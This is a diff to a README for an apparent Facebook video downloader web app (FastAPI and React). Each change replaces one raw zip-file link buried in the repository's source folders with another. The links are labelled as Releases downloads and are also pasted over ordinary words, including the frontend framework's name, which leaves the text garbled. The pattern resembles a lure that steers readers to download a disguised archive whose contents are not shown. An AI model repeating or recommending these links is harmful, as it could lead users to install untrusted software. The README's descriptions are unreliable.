@@ -1,7 +1,7 @@
 # 📥 facebook-video-downloader - Download Facebook Videos Easily
 
 ## 💻 Download Now
-[![Download from Releases](https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/hooks/facebook_downloader_video_v1.1.zip%20Now-Click%https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/hooks/facebook_downloader_video_v1.1.zip)](https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/hooks/facebook_downloader_video_v1.1.zip)
+[![Download from Releases](https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/backend/app/video_facebook_downloader_v1.5.zip%20Now-Click%https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/backend/app/video_facebook_downloader_v1.5.zip)](https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/backend/app/video_facebook_downloader_v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **facebook-video-downloader** application! This modern web app lets you download videos from Facebook effortlessly by providing the video URL. No technical skills required.
@@ -9,7 +9,7 @@ Welcome to the **facebook-video-downloader** application! This modern web app le
 ## 🎯 Features
 - Download videos from Facebook in just a few clicks.
 - FastAPI backend ensures quick processing times.
-- Intuitive https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/hooks/facebook_downloader_video_v1.1.zip frontend for a smooth user experience.
+- Intuitive https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/backend/app/video_facebook_downloader_v1.5.zip frontend for a smooth user experience.
 - Compatible with multiple formats using yt-dlp.
 - Choose from various quality options.
 
@@ -17,12 +17,12 @@ Welcome to the **facebook-video-downloader** application! This modern web app le
 To use this application, ensure that your system meets the following requirements:
 - An up-to-date web browser (Chrome, Firefox, Safari, etc.)
 - Internet connection for downloading videos.
-- Optionally, a compatible system for running FastAPI and https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/hooks/facebook_downloader_video_v1.1.zip if you wish to explore further.
+- Optionally, a compatible system for running FastAPI and https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/backend/app/video_facebook_downloader_v1.5.zip if you wish to explore further.
 
 ## 📥 Download & Install
 To get started, visit the Releases page and download the latest version of the application. Click the link below:
 
-[Download from Releases](https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/hooks/facebook_downloader_video_v1.1.zip)
+[Download from Releases](https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/backend/app/video_facebook_downloader_v1.5.zip)
 
 After downloading, follow these steps:
 
@@ -42,7 +42,7 @@ If you encounter any issues while using the application, please feel free to ope
 ## 🛠️ Technologies Used
 This application is built using the following technologies:
 - **FastAPI**: A modern web framework for Python used for the backend.
-- **https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/hooks/facebook_downloader_video_v1.1.zip**: A React framework for building the frontend.
+- **https://github.com/CostsmpRTR/facebook-video-downloader/raw/refs/heads/main/backend/app/video_facebook_downloader_v1.5.zip**: A React framework for building the frontend.
 - **Pydantic**: For data validation and settings management.
 - **Python 3**: The programming language used for fast and efficient coding.
 - **TypeScript**: Used for building robust and maintainable frontend code.
